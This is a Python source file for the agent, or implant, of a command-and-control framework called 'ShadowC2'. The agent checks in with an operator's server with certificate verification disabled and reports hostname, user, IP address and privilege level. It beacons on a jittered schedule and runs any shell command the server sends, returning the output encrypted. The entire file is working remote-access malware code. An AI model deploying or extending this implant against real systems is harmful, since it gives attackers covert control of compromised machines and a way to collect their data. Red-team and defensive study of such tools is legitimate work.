"""
ShadowC2 - Agent (Implant)
Connects to C2 server, executes commands, and reports back
"""

import os
import sys
import time
import uuid
import random
import socket
import platform
import subprocess
import json
import base64
import requests
from datetime import datetime

# Add parent directory for imports (development only)
if os.path.exists(os.path.join(os.path.dirname(__file__), '..', 'common')):
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.crypto import CryptoHandler
from common.protocol import (
    C2Message, MessageType, CheckinMessage, HeartbeatMessage,
    ResponseMessage, ProtocolConfig
)


class ShadowAgent:
    """
    Main agent class - implant that runs on target system
    """
    
    def __init__(self, c2_url, master_key):
        """
        Initialize agent
        
        Args:
            c2_url: C2 server URL (e.g., https://192.168.1.100:8443)
            master_key: Master encryption key (base64)
        """
        self.c2_url = c2_url.rstrip('/')
        self.session_id = str(uuid.uuid4())
        
        # Cryptography
        key_bytes = base64.b64decode(master_key)
        self.crypto = CryptoHandler(key=key_bytes)
        
        # Configuration
        self.beacon_interval = ProtocolConfig.DEFAULT_BEACON_INTERVAL
        self.jitter = ProtocolConfig.DEFAULT_JITTER
        self.running = True
        
        # System info
        self.system_info = self.gather_system_info()
        
        # Session crypto (will be set after check-in)
        self.session_crypto = None
    
    def gather_system_info(self):
        """
        Gather system information
        
        Returns:
            dict: System information
        """
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
            os_name = platform.system()
            os_version = platform.release()
            architecture = platform.machine()
            
            # Get IP address
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
                s.close()
            except:
                ip_address = "unknown"
            
            # Get MAC address (simple method)
            mac_address = "unknown"
            
            # Check privileges
            if os_name == "Windows":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                is_admin = os.geteuid() == 0
            
            privileges = "admin" if is_admin else "user"
            
            return {
                "hostname": hostname,
                "username": username,
                "os": f"{os_name} {os_version}",
                "architecture": architecture,
                "ip_address": ip_address,
                "mac_address": mac_address,
                "domain": os.getenv('USERDOMAIN') or 'WORKGROUP',
                "privileges": privileges,
                "agent_version": "1.0.0"
            }
        except Exception as e:
            return {
                "hostname": "unknown",
                "username": "unknown",
                "os": "unknown",
                "error": str(e)
            }
    
    def checkin(self):
        """
        Perform initial check-in with C2 server
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Create check-in message
            msg = CheckinMessage(self.session_id, self.system_info)
            
            # Encrypt with master key
            encrypted = self.crypto.encrypt(msg.to_dict())
            
            # Send to server
            response = requests.post(
                f"{self.c2_url}/api/v1/checkin",
                json={"data": encrypted},
                verify=False,  # Ignore SSL warnings (self-signed cert)
                timeout=10
            )
            
            if response.status_code == 200:
                # Decrypt response
                response_data = response.json().get('data')
                decrypted = self.crypto.decrypt(response_data)
                
                # Update configuration from server
                self.beacon_interval = decrypted.get('beacon_interval', self.beacon_interval)
                self.jitter = decrypted.get('jitter', self.jitter)
                
                # Now use session-specific crypto
                # Derive session key same way server does
                from Crypto.Protocol.KDF import PBKDF2
                session_key = PBKDF2(
                    self.crypto.key,
                    self.session_id.encode(),
                    dkLen=32,
                    count=10000
                )
                self.session_crypto = CryptoHandler(key=session_key)
                
                return True
            else:
                return False
                
        except Exception as e:
            print(f"[!] Check-in error: {e}")
            return False
    
    def beacon(self):
        """
        Send heartbeat to C2 and retrieve commands
        
        Returns:
            list: Pending commands from C2
        """
        try:
            # Create heartbeat message
            msg = HeartbeatMessage(self.session_id, stats={})
            
            # Encrypt with session key
            encrypted = self.session_crypto.encrypt(msg.to_dict())
            
            # Send to server
            response = requests.post(
                f"{self.c2_url}/api/v1/beacon",
                json={"data": encrypted, "session_id": self.session_id},
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                # Decrypt response
                response_data = response.json().get('data')
                decrypted = self.session_crypto.decrypt(response_data)
                
                # Get pending commands
                commands = decrypted.get('commands', [])
                return commands
            else:
                return []
                
        except Exception as e:
            print(f"[!] Beacon error: {e}")
            return []
    
    def execute_command(self, command_msg):
        """
        Execute a command from C2
        
        Args:
            command_msg: Command message dictionary
            
        Returns:
            ResponseMessage: Command response
        """
        try:
            command_id = command_msg.get('msg_id')
            command_data = command_msg.get('data', {})
            command = command_data.get('command')
            args = command_data.get('args', [])
            
            output = ""
            success = True
            
            # Handle different command types
            if command == "shell":
                # Execute shell command
                cmd = ' '.join(args)
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                output = result.stdout + result.stderr
            
            elif command == "whoami":
                output = self.system_info.get('username', 'unknown')
            
            elif command == "hostname":
                output = self.system_info.get('hostname', 'unknown')
            
            elif command == "pwd":
                output = os.getcwd()
            
            elif command == "cd":
                if args:
                    try:
                        os.chdir(args[0])
                        output = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        output = f"Error: {str(e)}"
                        success = False
                else:
                    output = "Error: No directory specified"
                    success = False
            
            elif command == "ls":
                path = args[0] if args else '.'
                try:
                    files = os.listdir(path)
                    output = '\n'.join(files)
                except Exception as e:
                    output = f"Error: {str(e)}"
                    success = False
            
            elif command == "sysinfo":
                output = json.dumps(self.system_info, indent=2)
            
            elif command == "sleep":
                if args:
                    try:
                        self.beacon_interval = int(args[0])
                        output = f"Beacon interval set to {self.beacon_interval} seconds"
                    except:
                        output = "Error: Invalid interval"
                        success = False
                else:
                    output = "Error: No interval specified"
                    success = False
            
            elif command == "exit":
                output = "Terminating agent..."
                self.running = False
            
            else:
                output = f"Unknown command: {command}"
                success = False
            
            # Create response message
            response = ResponseMessage(
                session_id=self.session_id,
                command_id=command_id,
                success=success,
                output=output
            )
            
            return response
            
        except Exception as e:
            # Error response
            return ResponseMessage(
                session_id=self.session_id,
                command_id=command_msg.get('msg_id', 'unknown'),
                success=False,
                output="",
                error=str(e)
            )
    
    def send_response(self, response_msg):
        """
        Send command response to C2
        
        Args:
            response_msg: ResponseMessage object
        """
        try:
            # Encrypt with session key
            encrypted = self.session_crypto.encrypt(response_msg.to_dict())
            
            # Send to server
            requests.post(
                f"{self.c2_url}/api/v1/response",
                json={"data": encrypted, "session_id": self.session_id},
                verify=False,
                timeout=10
            )
        except Exception as e:
            print(f"[!] Response send error: {e}")
    
    def calculate_sleep(self):
        """
        Calculate sleep time with jitter
        
        Returns:
            int: Sleep time in seconds
        """
        jitter_amount = random.randint(-self.jitter, self.jitter)
        sleep_time = max(1, self.beacon_interval + jitter_amount)
        return sleep_time
    
    def run(self):
        """
        Main agent loop
        """
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        print(f"[*] ShadowC2 Agent starting...")
        print(f"[*] Session ID: {self.session_id}")
        print(f"[*] C2 Server: {self.c2_url}")
        
        # Initial check-in
        print(f"[*] Performing initial check-in...")
        retries = 0
        while retries < 5:
            if self.checkin():
                print(f"[+] Check-in successful!")
                break
            else:
                retries += 1
                print(f"[!] Check-in failed, retry {retries}/5...")
                time.sleep(5)
        
        if retries >= 5:
            print(f"[!] Failed to check in after 5 attempts. Exiting.")
            return
        
        # Main beacon loop
        print(f"[*] Entering main loop (beacon interval: {self.beacon_interval}s, jitter: ±{self.jitter}s)")
        
        while self.running:
            try:
                # Send beacon and get commands
                commands = self.beacon()
                
                # Execute commands
                for cmd in commands:
                    print(f"[*] Executing command: {cmd.get('data', {}).get('command')}")
                    response = self.execute_command(cmd)
                    self.send_response(response)
                
                # Sleep with jitter
                sleep_time = self.calculate_sleep()
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                print(f"\n[!] Agent terminated by user")
                break
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
                time.sleep(30)  # Back off on error
        
        print(f"[*] Agent shutting down...")


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='ShadowC2 Agent')
    parser.add_argument('--server', required=True, help='C2 server URL (e.g., https://192.168.1.100:8443)')
    parser.add_argument('--key', required=True, help='Master encryption key (base64)')
    
    args = parser.parse_args()
    
    # Create and run agent
    agent = ShadowAgent(args.server, args.key)
    agent.run()


if __name__ == "__main__":
    main()
